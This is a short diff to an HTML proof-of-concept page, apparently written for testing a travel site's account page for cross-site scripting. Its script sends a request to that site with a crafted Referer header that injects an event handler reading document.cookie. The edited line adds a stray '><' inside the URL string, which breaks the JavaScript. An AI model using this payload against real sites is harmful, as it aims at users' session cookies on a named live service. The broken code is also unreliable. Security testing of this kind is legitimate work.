@@ -9,7 +9,7 @@
     <script>
     document.getElementById("xssLink").addEventListener("click", function() {
         // Construct the URL with the malicious Referer header
-        var url = "http://travelpirates.hometogo.com/account/";
+        var url = "https://travelpirates.hometogo.com/account/"><";
         var xhr = new XMLHttpRequest();
         xhr.open("GET", url, true);
         xhr.setRequestHeader("Referer", 'tester90?><>><<x12 only=xxxxx onpointermove=prompt(document?.cookie)>hover-here-for-xss');
